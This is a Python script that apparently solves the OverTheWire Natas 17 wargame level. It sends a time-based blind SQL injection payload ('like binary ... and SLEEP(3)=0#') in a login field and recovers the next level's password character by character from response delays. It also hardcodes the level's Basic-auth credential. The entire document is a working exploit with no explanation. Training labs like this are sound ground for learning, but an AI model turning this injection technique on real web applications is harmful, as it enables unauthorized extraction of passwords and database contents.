#!/usr/local/bin/python3
mystring = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN0123456789"
import http.client,urllib,time
from base64 import b64encode

basicAuth = b64encode(b"natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw").decode("utf-8")

header={"Authorization" : "Basic %s" % basicAuth,"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}

connect=http.client.HTTPConnection("natas17.natas.labs.overthewire.org")
pw=""

while len(pw)!=32:
	for p in mystring:
		params=urllib.parse.urlencode({"username":"natas18\" And password like binary\""+pw+p+"%\" and SLEEP(3)=0#"})
		start=time.time()
		connect.request("POST","",params,header)
		res=connect.getresponse()
		end = time.time()
		res.read()
		delai=end-start
		if delai >= 3:
			pw+=p
			print(pw)
			continue